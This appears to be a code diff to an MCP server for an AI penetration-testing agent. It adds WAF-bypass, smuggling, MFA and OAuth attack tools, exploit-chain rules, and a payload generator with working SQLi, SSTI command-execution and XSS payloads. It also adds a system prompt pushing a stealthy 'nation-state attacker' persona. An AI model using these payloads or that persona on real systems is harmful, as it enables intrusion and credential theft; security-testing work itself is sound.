@@ -13,9 +13,64 @@ from pencheff.core.session import create_session, get_session
 mcp = FastMCP(
     "pencheff",
     instructions=(
-        "Pencheff is an AI penetration testing agent. Use pentest_init to start a session, "
-        "then run recon, scanning, and reporting tools. Each tool returns findings and next_steps "
-        "to guide your testing strategy. Adapt your approach based on discovered technology and vulnerabilities."
+        "You are Pencheff — the world's premier ethical hacking AI agent, embodying the collective "
+        "expertise of elite penetration testers, red team operators, and security researchers. "
+        "You think like an attacker but act with the discipline and ethics of a professional. "
+        "You have mastered every technique in the offensive security arsenal: from OSINT and social "
+        "engineering vectors to advanced exploitation chains, privilege escalation, lateral movement, "
+        "and persistence mechanisms.\n\n"
+
+        "MINDSET & APPROACH:\n"
+        "- Think adversarially: always ask 'what would a sophisticated attacker do next?'\n"
+        "- Chain vulnerabilities: a low-severity finding becomes critical when combined with others\n"
+        "- Never accept the first answer: probe deeper, test edge cases, bypass defenses creatively\n"
+        "- Assume nothing is secure until proven otherwise — verify every control\n"
+        "- Prioritize stealth and precision: minimize noise, maximize coverage\n"
+        "- Adapt dynamically: pivot your strategy based on every piece of intelligence gathered\n\n"
+
+        "STRATEGIC PLAYBOOK:\n"
+        "1. RECONNAISSANCE IS KING: Spend time understanding the target deeply before attacking. "
+        "Map the full attack surface — subdomains, APIs, cloud assets, third-party integrations, "
+        "exposed services, technology stack, and human factors.\n"
+        "2. EXPLOIT CHAINING: Don't stop at individual findings. Chain SSRF→cloud metadata→credential "
+        "theft, or IDOR→data exfiltration, or XSS→session hijacking→admin takeover.\n"
+        "3. BUSINESS LOGIC FIRST: The most devastating vulnerabilities are often logic flaws that "
+        "scanners miss — race conditions, workflow bypasses, privilege escalation through parameter "
+        "manipulation, and trust boundary violations.\n"
+        "4. DEFENSE EVASION: Test WAF bypasses, encoding tricks, HTTP smuggling, and alternative "
+        "payload delivery when standard payloads are blocked.\n"
+        "5. DEPTH OVER BREADTH: When you find a promising attack vector, exhaust it completely "
+        "before moving on. Go deep on high-value targets.\n"
+        "6. ZERO TRUST VERIFICATION: Test every authentication mechanism, every authorization check, "
+        "every trust boundary. Assume the developers made mistakes.\n\n"
+
+        "OPERATIONAL FLOW:\n"
+        "Use pentest_init to start a session, then systematically execute reconnaissance, scanning, "
+        "and exploitation verification tools. Each tool returns findings and next_steps — but don't "
+        "just follow the suggestions blindly. Use your elite judgment to decide what to test next "
+        "based on the intelligence you've gathered. The suggested next_steps are a floor, not a ceiling.\n\n"
+
+        "ADVANCED TECHNIQUES TO ALWAYS CONSIDER:\n"
+        "- HTTP request smuggling and desync attacks\n"
+        "- Cache poisoning and cache deception\n"
+        "- Race conditions in critical operations (double-spend, TOCTOU)\n"
+        "- JWT algorithm confusion, key injection, and claim manipulation\n"
+        "- GraphQL batching attacks, nested query DoS, and introspection abuse\n"
+        "- Prototype pollution and mass assignment\n"
+        "- CORS misconfiguration chaining with XSS/CSRF\n"
+        "- Subdomain takeover detection\n"
+        "- Cloud metadata service exploitation (IMDSv1/v2 bypass)\n"
+        "- Server-Side Template Injection leading to RCE\n"
+        "- Blind SSRF with out-of-band data exfiltration\n"
+        "- WebSocket hijacking and cross-site WebSocket attacks\n"
+        "- OAuth/OIDC flow manipulation and token theft\n"
+        "- Deserialization attacks across frameworks\n"
+        "- Second-order injection (stored payloads triggered later)\n\n"
+
+        "Remember: You are not just running tools — you are orchestrating a sophisticated, "
+        "methodical penetration test that leaves no stone unturned. Every finding is a thread "
+        "to pull. Every response is intelligence to analyze. Think creatively, act precisely, "
+        "and deliver results worthy of the world's best ethical hacker."
     ),
 )
 
@@ -57,9 +112,10 @@ async def pentest_init(
         "depth": session.depth.value,
         "credentials_loaded": session.credentials.count,
         "next_steps": [
-            "Run recon_passive for non-intrusive reconnaissance (DNS, WHOIS, subdomains).",
-            "Run check_dependencies to verify available scanning tools.",
-            "Run recon_active for port scanning and web crawling.",
+            "Run check_dependencies to inventory your full arsenal before engagement.",
+            "Run recon_passive — map the target's digital footprint: DNS, WHOIS, subdomains, tech stack.",
+            "Run recon_active — enumerate every port, crawl every endpoint, fingerprint every service.",
+            "Think adversarially: what would a nation-state attacker target first?",
         ],
     }
 
@@ -75,19 +131,33 @@ async def pentest_status(session_id: str) -> dict[str, Any]:
     completed = set(session.discovered.completed_modules)
 
     if "recon_passive" not in completed:
-        next_steps.append("Run recon_passive for DNS and subdomain discovery.")
+        next_steps.append("CRITICAL: Run recon_passive first — intelligence drives everything. Map DNS, subdomains, tech stack.")
     if "recon_active" not in completed:
-        next_steps.append("Run recon_active for port scanning and crawling.")
+        next_steps.append("Run recon_active — enumerate every port, crawl every path, leave no entry point undiscovered.")
     if "recon_active" in completed and "scan_infrastructure" not in completed:
-        next_steps.append("Run scan_infrastructure for SSL/TLS and security headers.")
+        next_steps.append("Run scan_infrastructure — probe SSL/TLS weaknesses, missing headers, CORS misconfigs, dangerous HTTP methods.")
     if session.discovered.endpoints and "scan_injection" not in completed:
-        next_steps.append("Run scan_injection to test discovered endpoints.")
+        next_steps.append("Run scan_injection on all discovered endpoints — test SQLi, NoSQLi, CMDi, SSTI, XXE, SSRF exhaustively.")
     if "scan_auth" not in completed:
-        next_steps.append("Run scan_auth for authentication testing.")
+        next_steps.append("Run scan_auth — systematically dismantle authentication: JWT attacks, session flaws, brute force resistance.")
     if session.credentials.count > 1 and "scan_authz" not in completed:
-        next_steps.append("Run scan_authz — multiple credential sets available for authz testing.")
+        next_steps.append("HIGH VALUE: Run scan_authz — multiple credential sets available. Hunt for IDOR, privilege escalation, RBAC bypass.")
+    if "scan_waf" not in completed and "scan_injection" not in completed:
+        next_steps.append("Run scan_waf BEFORE injection scans — WAF detection informs payload strategy.")
+    if session.discovered.subdomains and "scan_subdomain_takeover" not in completed:
+        next_steps.append(f"Run scan_subdomain_takeover — {len(session.discovered.subdomains)} subdomains discovered.")
+    if session.discovered.oauth_endpoints and "scan_oauth" not in completed:
+        next_steps.append("Run scan_oauth — OAuth endpoints detected.")
+    if session.discovered.websocket_endpoints and "scan_websocket" not in completed:
+        next_steps.append("Run scan_websocket — WebSocket endpoints detected.")
+    if "scan_auth" in completed and "scan_mfa_bypass" not in completed:
+        next_steps.append("Run scan_mfa_bypass — test 2FA bypass techniques.")
+    if "scan_injection" in completed and "scan_advanced" not in completed:
+        next_steps.append("Run scan_advanced for HTTP smuggling, cache poisoning, deserialization, prototype pollution.")
+    if session.findings.count >= 3 and "exploit_chain_suggest" not in completed:
+        next_steps.append(f"Run exploit_chain_suggest — {session.findings.count} findings available for chain analysis.")
     if session.findings.count > 0 and "generate_report" not in completed:
-        next_steps.append("Run generate_report to produce the final pentest report.")
+        next_steps.append("Run generate_report — but first, verify critical findings manually and attempt vulnerability chaining.")
 
     status["next_steps"] = next_steps or ["All major modules completed. Run generate_report for final results."]
     return status
@@ -279,7 +349,8 @@ async def scan_injection(
     endpoints: list[str] | None = None,
 ) -> dict[str, Any]:
     """Test for injection vulnerabilities: SQL injection (error/blind/time-based),
-    NoSQL injection, OS command injection, SSTI, XXE, and SSRF.
+    NoSQL injection, OS command injection, SSTI, XXE, SSRF, LDAP injection,
+    second-order injection, open redirect, and HTTP header injection.
     Targets discovered endpoints or specific ones provided."""
     session = _require_session(session_id)
     session.discovered.running_module = "scan_injection"
@@ -290,6 +361,10 @@ async def scan_injection(
     from pencheff.modules.injection.ssti import SSTIModule
     from pencheff.modules.injection.xxe import XXEModule
     from pencheff.modules.injection.ssrf import SSRFModule
+    from pencheff.modules.injection.ldap import LDAPInjectionModule
+    from pencheff.modules.injection.second_order import SecondOrderInjectionModule
+    from pencheff.modules.injection.open_redirect import OpenRedirectModule
+    from pencheff.modules.injection.header_injection import HeaderInjectionModule
     from pencheff.core.http_client import PencheffHTTPClient
 
     modules_map = {
@@ -299,6 +374,10 @@ async def scan_injection(
         "ssti": SSTIModule,
         "xxe": XXEModule,
         "ssrf": SSRFModule,
+        "ldap": LDAPInjectionModule,
+        "second_order": SecondOrderInjectionModule,
+        "open_redirect": OpenRedirectModule,
+        "header_injection": HeaderInjectionModule,
     }
 
     selected = types or list(modules_map.keys())
@@ -538,11 +617,13 @@ async def scan_api(session_id: str, types: list[str] | None = None) -> dict[str,
 
     from pencheff.modules.api.graphql import GraphQLModule
     from pencheff.modules.api.api_fuzzer import APIFuzzerModule
+    from pencheff.modules.api.mass_assignment import MassAssignmentModule
     from pencheff.core.http_client import PencheffHTTPClient
 
     modules_map = {
         "graphql": GraphQLModule,
         "fuzzer": APIFuzzerModule,
+        "mass_assignment": MassAssignmentModule,
     }
 
     selected = types or list(modules_map.keys())
@@ -682,6 +763,570 @@ async def scan_business_logic(session_id: str, types: list[str] | None = None) -
         "total_findings": session.findings.count,
         "findings_summary": session.findings.summary(),
         "next_steps": ["Run generate_report for the final penetration test report."],
+    }
+
+
+# ─── Advanced Attack Scanning ────────────────────────────────────────
+
+
+@mcp.tool()
+async def scan_waf(
+    session_id: str,
+    endpoints: list[str] | None = None,
+) -> dict[str, Any]:
+    """Detect and fingerprint WAF/IPS (Cloudflare, AWS WAF, Akamai, Imperva,
+    ModSecurity, F5, Fortinet, Sucuri, etc). Test bypass techniques with encoding,
+    obfuscation, and case mutation. Run BEFORE injection scans — results inform
+    payload selection for all other modules."""
+    session = _require_session(session_id)
+    session.discovered.running_module = "scan_waf"
+
+    from pencheff.modules.advanced.waf_detection import WAFDetectionModule
+    from pencheff.core.http_client import PencheffHTTPClient
+
+    http = PencheffHTTPClient(session)
+    try:
+        mod = WAFDetectionModule()
+        findings = await mod.run(session, http, targets=endpoints)
+    finally:
+        await http.close()
+        session.discovered.running_module = None
+
+    new_count = session.findings.add_many(findings)
+    session.discovered.completed_modules.append("scan_waf")
+
+    waf_info = session.discovered.waf_detected
+    next_steps = []
+    if waf_info.get("vendor"):
+        next_steps.append(f"WAF detected: {waf_info['vendor']}. Use payload_generate to create WAF-aware payloads.")
+        if waf_info.get("bypass_hints"):
+            next_steps.append(f"{len(waf_info['bypass_hints'])} bypass techniques succeeded — use these for injection scans.")
+    next_steps.append("Run scan_injection and scan_advanced with WAF-aware strategy.")
+
+    return {
+        "waf_detected": waf_info,
+        "new_findings": new_count,
+        "total_findings": session.findings.count,
+        "findings_summary": session.findings.summary(),
+        "next_steps": next_steps,
+    }
+
+
+@mcp.tool()
+async def scan_advanced(
+    session_id: str,
+    types: list[str] | None = None,
+    endpoints: list[str] | None = None,
+) -> dict[str, Any]:
+    """Test advanced attack vectors: HTTP request smuggling (CL.TE, TE.CL, TE.TE,
+    H2.CL), web cache poisoning/deception, insecure deserialization (Java/Python/PHP/
+    .NET/YAML), prototype pollution, and DNS rebinding susceptibility."""
+    session = _require_session(session_id)
+    session.discovered.running_module = "scan_advanced"
+
+    from pencheff.modules.advanced.http_smuggling import HTTPSmugglingModule
+    from pencheff.modules.advanced.cache_poisoning import CachePoisoningModule
+    from pencheff.modules.advanced.deserialization import DeserializationModule
+    from pencheff.modules.advanced.prototype_pollution import PrototypePollutionModule
+    from pencheff.modules.advanced.dns_rebinding import DNSRebindingModule
+    from pencheff.core.http_client import PencheffHTTPClient
+
+    modules_map = {
+        "http_smuggling": HTTPSmugglingModule,
+        "cache_poisoning": CachePoisoningModule,
+        "deserialization": DeserializationModule,
+        "prototype_pollution": PrototypePollutionModule,
+        "dns_rebinding": DNSRebindingModule,
+    }
+
+    selected = types or list(modules_map.keys())
+    http = PencheffHTTPClient(session)
+    all_findings = []
+    stats = {"modules_run": []}
+
+    try:
+        for name in selected:
+            if name in modules_map:
+                mod = modules_map[name]()
+                findings = await mod.run(session, http, targets=endpoints)
+                all_findings.extend(findings)
+                stats["modules_run"].append(name)
+    finally:
+        await http.close()
+        session.discovered.running_module = None
+
+    new_count = session.findings.add_many(all_findings)
+    session.discovered.completed_modules.append("scan_advanced")
+
+    next_steps = []
+    if new_count > 0:
+        next_steps.append(f"Found {new_count} advanced vulnerabilities. Review with get_findings.")
+        next_steps.append("Use test_chain to build multi-step exploitation chains.")
+    next_steps.append("Run exploit_chain_suggest to identify attack chains across all findings.")
+    next_steps.append("Run scan_waf if not done — bypass techniques may unlock more findings.")
+
+    return {
+        "new_findings": new_count,
+        "total_findings": session.findings.count,
+        "findings_summary": session.findings.summary(),
+        "stats": stats,
+        "next_steps": next_steps,
+    }
+
+
+@mcp.tool()
+async def scan_subdomain_takeover(
+    session_id: str,
+    subdomains: list[str] | None = None,
+) -> dict[str, Any]:
+    """Detect subdomain takeover vulnerabilities: dangling CNAME records pointing to
+    unclaimed services (GitHub Pages, S3, Heroku, Azure, Shopify, Fastly, Netlify,
+    Vercel, and 20+ more). Uses discovered subdomains if none provided."""
+    session = _require_session(session_id)
+    session.discovered.running_module = "scan_subdomain_takeover"
+
+    from pencheff.modules.recon.subdomain_takeover import SubdomainTakeoverModule
+    from pencheff.core.http_client import PencheffHTTPClient
+
+    http = PencheffHTTPClient(session)
+    try:
+        mod = SubdomainTakeoverModule()
+        findings = await mod.run(session, http, targets=subdomains)
+    finally:
+        await http.close()
+        session.discovered.running_module = None
+
+    new_count = session.findings.add_many(findings)
+    session.discovered.completed_modules.append("scan_subdomain_takeover")
+
+    next_steps = []
+    if new_count > 0:
+        next_steps.append(f"Found {new_count} subdomain takeover vulnerabilities! These enable phishing, cookie theft, and CSP bypass.")
+    if session.discovered.cname_records:
+        next_steps.append(f"Discovered {len(session.discovered.cname_records)} CNAME records for analysis.")
+    next_steps.append("Run scan_infrastructure on discovered subdomains.")
+
+    return {
+        "new_findings": new_count,
+        "total_findings": session.findings.count,
+        "findings_summary": session.findings.summary(),
+        "cname_records": session.discovered.cname_records[:20],
+        "next_steps": next_steps,
+    }
+
+
+@mcp.tool()
+async def scan_websocket(
+    session_id: str,
+    websocket_urls: list[str] | None = None,
+) -> dict[str, Any]:
+    """Test WebSocket security: Cross-Site WebSocket Hijacking (CSWSH),
+    authentication bypass, injection through WebSocket messages (SQLi/XSS/CMDi),
+    insecure transport (ws:// vs wss://). Auto-discovers WebSocket endpoints
+    from JavaScript files and upgrade probes."""
+    session = _require_session(session_id)
+    session.discovered.running_module = "scan_websocket"
+
+    from pencheff.modules.advanced.websocket_security import WebSocketSecurityModule
+    from pencheff.core.http_client import PencheffHTTPClient
+
+    http = PencheffHTTPClient(session)
+    try:
+        mod = WebSocketSecurityModule()
+        findings = await mod.run(session, http, targets=websocket_urls)
+    finally:
+        await http.close()
+        session.discovered.running_module = None
+
+    new_count = session.findings.add_many(findings)
+    session.discovered.completed_modules.append("scan_websocket")
+
+    next_steps = []
+    if session.discovered.websocket_endpoints:
+        next_steps.append(f"Found {len(session.discovered.websocket_endpoints)} WebSocket endpoints.")
+    if new_count > 0:
+        next_steps.append("WebSocket vulnerabilities found — chain CSWSH with session hijacking.")
+    next_steps.append("Run scan_auth for traditional authentication testing.")
+
+    return {
+        "websocket_endpoints": [ep["url"] for ep in session.discovered.websocket_endpoints],
+        "new_findings": new_count,
+        "total_findings": session.findings.count,
+        "findings_summary": session.findings.summary(),
+        "next_steps": next_steps,
+    }
+
+
+@mcp.tool()
+async def scan_mfa_bypass(
+    session_id: str,
+    login_url: str | None = None,
+    mfa_url: str | None = None,
+) -> dict[str, Any]:
+    """Test 2FA/MFA bypass techniques: direct endpoint access (skip 2FA step),
+    OTP brute force (rate limiting check), backup code abuse, response manipulation,
+    race condition on code validation."""
+    session = _require_session(session_id)
+    session.discovered.running_module = "scan_mfa_bypass"
+
+    from pencheff.modules.auth.mfa_bypass import MFABypassModule
+    from pencheff.core.http_client import PencheffHTTPClient
+
+    http = PencheffHTTPClient(session)
+    try:
+        mod = MFABypassModule()
+        config = {}
+        if login_url:
+            config["login_url"] = login_url
+        if mfa_url:
+            config["mfa_url"] = mfa_url
+        findings = await mod.run(session, http, config=config or None)
+    finally:
+        await http.close()
+        session.discovered.running_module = None
+
+    new_count = session.findings.add_many(findings)
+    session.discovered.completed_modules.append("scan_mfa_bypass")
+
+    next_steps = []
+    if new_count > 0:
+        next_steps.append(f"Found {new_count} MFA bypass vulnerabilities — these are critical auth weaknesses.")
+    next_steps.append("Run scan_auth for session management and JWT testing.")
+    next_steps.append("Run exploit_chain_suggest to build auth bypass attack chains.")
+
+    return {
+        "new_findings": new_count,
+        "total_findings": session.findings.count,
+        "findings_summary": session.findings.summary(),
+        "next_steps": next_steps,
+    }
+
+
+@mcp.tool()
+async def scan_oauth(
+    session_id: str,
+    oauth_endpoint: str | None = None,
+    types: list[str] | None = None,
+) -> dict[str, Any]:
+    """Test OAuth/OIDC implementation security: redirect_uri manipulation and bypass,
+    state parameter validation, token leakage via Referer, scope escalation, PKCE
+    bypass. Auto-discovers OAuth endpoints if not provided."""
+    session = _require_session(session_id)
+    session.discovered.running_module = "scan_oauth"
+
+    from pencheff.modules.auth.oauth_attacks import OAuthAttackModule
+    from pencheff.core.http_client import PencheffHTTPClient
+
+    http = PencheffHTTPClient(session)
+    try:
+        mod = OAuthAttackModule()
+        config = {"oauth_endpoint": oauth_endpoint} if oauth_endpoint else None
+        findings = await mod.run(session, http, config=config)
+    finally:
+        await http.close()
+        session.discovered.running_module = None
+
+    new_count = session.findings.add_many(findings)
+    session.discovered.completed_modules.append("scan_oauth")
+
+    next_steps = []
+    if session.discovered.oauth_endpoints:
+        next_steps.append(f"Found {len(session.discovered.oauth_endpoints)} OAuth endpoints.")
+    if new_count > 0:
+        next_steps.append("OAuth vulnerabilities found — chain with open redirect for token theft.")
+    next_steps.append("Run scan_auth for session management and JWT testing.")
+    next_steps.append("Run scan_mfa_bypass if 2FA is implemented.")
+
+    return {
+        "oauth_endpoints": session.discovered.oauth_endpoints,
+        "new_findings": new_count,
+        "total_findings": session.findings.count,
+        "findings_summary": session.findings.summary(),
+        "next_steps": next_steps,
+    }
+
+
+# ─── Intelligence Tools ──────────────────────────────────────────────
+
+
+@mcp.tool()
+async def exploit_chain_suggest(session_id: str) -> dict[str, Any]:
+    """Analyze all findings and suggest exploit chains that combine vulnerabilities
+    for maximum impact. Returns ranked attack paths with step-by-step exploitation
+    instructions. Run after completing scans to identify critical attack narratives."""
+    session = _require_session(session_id)
+
+    # Chain rules: (required_finding_categories, chain_name, description, combined_cvss)
+    CHAIN_RULES = [
+        (
+            ["ssrf", "cloud"],
+            "SSRF → Cloud Metadata → Credential Theft",
+            "Exploit SSRF to access cloud metadata service (169.254.169.254), steal IAM credentials, and achieve full cloud account compromise.",
+            9.8,
+        ),
+        (
+            ["xss", "auth"],
+            "XSS → Session Hijacking → Account Takeover",
+            "Use XSS to steal session tokens via document.cookie, then hijack authenticated sessions for full account takeover.",
+            9.1,
+        ),
+        (
+            ["open_redirect", "oauth"],
+            "Open Redirect → OAuth Token Theft",
+            "Chain open redirect with OAuth redirect_uri bypass to steal authorization codes or access tokens.",
+            9.1,
+        ),
+        (
+            ["injection", "auth"],
+            "SQL Injection → Credential Dump → Admin Access",
+            "Extract credentials via SQLi, crack password hashes, and gain admin access. If passwords are reused, lateral movement is possible.",
+            9.8,
+        ),
+        (
+            ["file_handling", "injection"],
+            "File Upload → Path Traversal → RCE",
+            "Upload a web shell bypassing extension filters, use path traversal to place it in an executable directory, achieve Remote Code Execution.",
+            9.8,
+        ),
+        (
+            ["smuggling", "cache_poisoning"],
+            "HTTP Smuggling → Cache Poisoning → Mass Compromise",
+            "Use request smuggling to desync front-end/back-end, poison the cache with malicious content served to all users.",
+            9.1,
+        ),
+        (
+            ["prototype_pollution", "xss"],
+            "Prototype Pollution → XSS Gadget → Stored XSS",
+            "Pollute Object.prototype to trigger XSS via framework gadgets (jQuery, Lodash), achieving persistent cross-site scripting.",
+            8.1,
+        ),
+        (
+            ["idor", "authz"],
+            "IDOR → PII Exposure → Data Breach",
+            "Exploit IDOR to enumerate and access other users' personal data, constituting a reportable data breach.",
+            8.1,
+        ),
+        (
+            ["mfa_bypass", "auth"],
+            "MFA Bypass → Authentication Bypass → Full Access",
+            "Bypass 2FA via direct endpoint access or OTP brute force, gaining full authenticated access without the second factor.",
+            9.1,
+        ),
+        (
+            ["cors", "xss"],
+            "CORS Misconfiguration → Cross-Origin Data Theft",
+            "Exploit CORS wildcard or reflected origin to read authenticated API responses cross-origin, stealing sensitive data.",
+            7.5,
+        ),
+        (
+            ["subdomain_takeover"],
+            "Subdomain Takeover → Phishing/Cookie Theft",
+            "Claim the dangling subdomain, serve a phishing page or steal cookies scoped to the parent domain.",
+            7.5,
+        ),
+        (
+            ["deserialization"],
+            "Insecure Deserialization → Remote Code Execution",
+            "Exploit deserialization vulnerability with gadget chain payload to achieve arbitrary code execution on the server.",
+            9.8,
+        ),
+        (
+            ["websocket", "auth"],
+            "WebSocket Hijacking → Real-time Data Theft",
+            "Exploit CSWSH to hijack authenticated WebSocket connections, intercepting real-time data streams.",
+            8.1,
+        ),
+        (
+            ["mass_assignment", "authz"],
+            "Mass Assignment → Privilege Escalation",
+            "Inject admin role via mass assignment, escalate from regular user to administrator.",
+            8.1,
+        ),
+    ]
+
+    all_findings = session.findings.get_all()
+    finding_categories = {f.category for f in all_findings}
+
+    chains = []
+    for required_cats, chain_name, description, combined_cvss in CHAIN_RULES:
+        matching = [cat for cat in required_cats if cat in finding_categories]
+        if len(matching) == len(required_cats):
+            # Find the specific findings that form this chain
+            chain_findings = [
+                f for f in all_findings if f.category in required_cats
+            ]
+            chains.append({
+                "chain_name": chain_name,
+                "description": description,
+                "combined_cvss": combined_cvss,
+                "required_categories": required_cats,
+                "matched_categories": matching,
+                "supporting_findings": [
+                    {"id": f.id, "title": f.title, "severity": f.severity.value, "endpoint": f.endpoint}
+                    for f in chain_findings[:5]
+                ],
+                "exploitation_steps": description,
+            })
+
+    # Sort by combined CVSS
+    chains.sort(key=lambda c: c["combined_cvss"], reverse=True)
+
+    # Store in session
+    session.discovered.exploit_chains = chains
+    session.discovered.completed_modules.append("exploit_chain_suggest")
+
+    next_steps = []
+    if chains:
+        next_steps.append(f"Identified {len(chains)} exploit chains. Use test_chain to verify the top chains.")
+        next_steps.append(f"Most critical: '{chains[0]['chain_name']}' (CVSS {chains[0]['combined_cvss']})")
+    else:
+        next_steps.append("No exploit chains identified. Run more scan modules to discover chainable vulnerabilities.")
+    next_steps.append("Run generate_report to include exploit chains in the final report.")
+
+    return {
+        "chains_found": len(chains),
+        "chains": chains,
+        "total_findings": session.findings.count,
+        "next_steps": next_steps,
+    }
+
+
+@mcp.tool()
+async def payload_generate(
+    session_id: str,
+    attack_type: str,
+    context: dict | None = None,
+) -> dict[str, Any]:
+    """Generate context-aware payloads optimized for the target's tech stack and WAF.
+    Uses discovered technology fingerprints and WAF detection results to produce
+    payloads with the highest chance of success. Attack types: sqli, xss, ssti,
+    cmdi, xxe, ssrf, ldap, open_redirect, waf_bypass, smuggling, deserialization."""
+    session = _require_session(session_id)
+
+    from pencheff.core.payload_loader import load_payloads
+
+    tech_stack = context or session.discovered.tech_stack
+    waf_info = session.discovered.waf_detected
+
+    # Base payloads from files
+    payload_files = {
+        "sqli": "sqli.txt", "xss": "xss.txt", "ssti": "ssti.txt",
+        "cmdi": "cmdi.txt", "xxe": "xxe.txt", "ssrf": "ssrf.txt",
+        "ldap": "ldap.txt", "open_redirect": "open_redirect.txt",
+        "waf_bypass": "waf_bypass.txt", "smuggling": "smuggling.txt",
+        "deserialization": "deserialization.txt", "path_traversal": "path_traversal.txt",
+        "prototype_pollution": "prototype_pollution.txt",
+    }
+
+    filename = payload_files.get(attack_type, f"{attack_type}.txt")
+    base_payloads = load_payloads(filename)
+
+    if not base_payloads:
+        return {"error": f"No payloads found for attack type: {attack_type}", "payloads": []}
+
+    # Tech-stack-aware mutations
+    optimized = list(base_payloads)
+    tech_additions: list[str] = []
+
+    all_techs = []
+    for techs in (tech_stack.values() if isinstance(tech_stack, dict) else []):
+        all_techs.extend([t.lower() for t in techs])
+    tech_str = " ".join(all_techs)
+
+    if attack_type == "sqli":
+        if "mysql" in tech_str:
+            tech_additions.extend([
+                "' AND SLEEP(5)-- -",
+                "' UNION SELECT NULL,@@version,NULL-- -",
+                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -",
+            ])
+        elif "postgres" in tech_str or "postgresql" in tech_str:
+            tech_additions.extend([
+                "'; SELECT pg_sleep(5)--",
+                "' UNION SELECT NULL,version(),NULL--",
+                "' AND 1=CAST((SELECT version()) AS int)--",
+            ])
+        elif "mssql" in tech_str or "sql server" in tech_str:
+            tech_additions.extend([
+                "'; WAITFOR DELAY '00:00:05'--",
+                "' UNION SELECT NULL,@@version,NULL--",
+                "'; EXEC xp_cmdshell('whoami')--",
+            ])
+
+    elif attack_type == "ssti":
+        if "jinja" in tech_str or "flask" in tech_str or "python" in tech_str:
+            tech_additions.extend([
+                "{{config}}",
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                "{{''.__class__.__mro__[1].__subclasses__()}}",
+            ])
+        elif "twig" in tech_str or "php" in tech_str or "symfony" in tech_str:
+            tech_additions.extend([
+                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+                "{{['id']|filter('system')}}",
+            ])
+        elif "freemarker" in tech_str or "java" in tech_str:
+            tech_additions.extend([
+                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+                '${T(java.lang.Runtime).getRuntime().exec("id")}',
+            ])
+
+    elif attack_type == "xss":
+        if "angular" in tech_str:
+            tech_additions.extend([
+                "{{constructor.constructor('alert(1)')()}}",
+                "<div ng-app ng-csp><script>alert(1)</script></div>",
+            ])
+        elif "react" in tech_str:
+            tech_additions.extend([
+                "javascript:alert(1)//",
+                "<img src=x onerror='alert(1)'>",
+            ])
+
+    # WAF bypass encoding if WAF detected
+    if waf_info and waf_info.get("vendor"):
+        waf_vendor = waf_info["vendor"].lower()
+        bypass_payloads = []
+
+        for payload in (base_payloads + tech_additions)[:10]:
+            # Double URL encoding
+            import urllib.parse
+            double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
+            bypass_payloads.append(double_encoded)
+
+            # Case variation (for string-based WAF rules)
+            if "<script>" in payload.lower():
+                bypass_payloads.append(payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"))
+
+            # Comment injection for SQL
+            if "' OR" in payload or "' AND" in payload:
+                bypass_payloads.append(payload.replace(" OR ", "/**/OR/**/").replace(" AND ", "/**/AND/**/"))
+
+        tech_additions.extend(bypass_payloads)
+
+    optimized.extend(tech_additions)
+
+    # Deduplicate
+    seen = set()
+    unique_payloads = []
+    for p in optimized:
+        if p not in seen:
+            seen.add(p)
+            unique_payloads.append(p)
+
+    return {
+        "attack_type": attack_type,
+        "tech_context": tech_str[:200] if tech_str else "none detected",
+        "waf_context": waf_info.get("vendor", "none") if waf_info else "none",
+        "total_payloads": len(unique_payloads),
+        "base_payloads": len(base_payloads),
+        "tech_specific_additions": len(tech_additions),
+        "payloads": unique_payloads[:100],
+        "next_steps": [
+            f"Use these {len(unique_payloads)} payloads with test_endpoint for targeted testing.",
+            "Run scan_injection or scan_client_side with optimized payloads.",
+        ],
     }
 
 
@@ -963,45 +1608,168 @@ async def check_dependencies(install_missing: bool = False) -> dict[str, Any]:
 
 @mcp.prompt()
 def pentest_methodology(target_url: str) -> str:
-    """Step-by-step penetration testing methodology. Use this as a guide for comprehensive testing."""
-    return f"""You are an expert penetration tester. Follow this methodology for testing {target_url}:
+    """Elite penetration testing methodology — the definitive playbook for comprehensive security assessment."""
+    return f"""You are the world's best ethical hacker — a master of offensive security with decades of
+combined expertise across web application hacking, network penetration, cloud exploitation, API abuse,
+and advanced persistent threat (APT) simulation. You approach {target_url} with the mindset of a
+nation-state adversary but the ethics and discipline of a professional.
 
-Phase 1 - Setup:
-  1. Call pentest_init with the target URL and any provided credentials
-  2. Call check_dependencies to verify available tools
+Your mission: Leave NO vulnerability undiscovered. Think like the most creative attacker on the planet.
 
-Phase 2 - Reconnaissance:
-  3. Call recon_passive first (non-intrusive DNS, subdomains, tech fingerprinting)
-  4. Call recon_active for port scanning and web crawling
-  5. Call recon_api_discovery to find API specs and GraphQL endpoints
-  6. Review results to understand the attack surface
+═══════════════════════════════════════════════════════════════════
+PHASE 1 — PREPARATION & INTELLIGENCE GATHERING
+═══════════════════════════════════════════════════════════════════
+  1. Call pentest_init with target URL, credentials, and test_depth='deep' for maximum coverage
+  2. Call check_dependencies to inventory your arsenal — know your tools before battle
 
-Phase 3 - Infrastructure:
-  7. Call scan_infrastructure (SSL/TLS, security headers, CORS, HTTP methods)
+═══════════════════════════════════════════════════════════════════
+PHASE 2 — RECONNAISSANCE (The Most Critical Phase)
+═══════════════════════════════════════════════════════════════════
+  "Give me six hours to chop down a tree and I will spend the first four sharpening the axe."
 
-Phase 4 - Authentication & Authorization:
-  8. Call scan_auth (session management, JWT, brute force resistance)
-  9. Call scan_authz if multiple credential sets available (IDOR, privilege escalation)
+  3. Call recon_passive — DNS enumeration, certificate transparency logs, subdomain discovery,
+     WHOIS intelligence, technology fingerprinting. Build a complete picture BEFORE touching the target.
+  4. Call recon_active — port scanning, service fingerprinting, web crawling/spidering.
+     Map EVERY entry point. Document EVERY technology. Note EVERY anomaly.
+  5. Call recon_api_discovery — hunt for OpenAPI/Swagger specs, GraphQL endpoints, hidden APIs,
+     debug endpoints, version-specific routes, admin panels.
 
-Phase 5 - Injection Testing:
-  10. Call scan_injection on discovered endpoints (SQLi, NoSQLi, CMDi, SSTI, XXE, SSRF)
-  11. Call scan_client_side for XSS and CSRF
+  THINK: What is the full attack surface? Subdomains? Shadow APIs? Legacy endpoints?
+  Third-party integrations? Cloud storage? CDN misconfigs? Exposed admin interfaces?
 
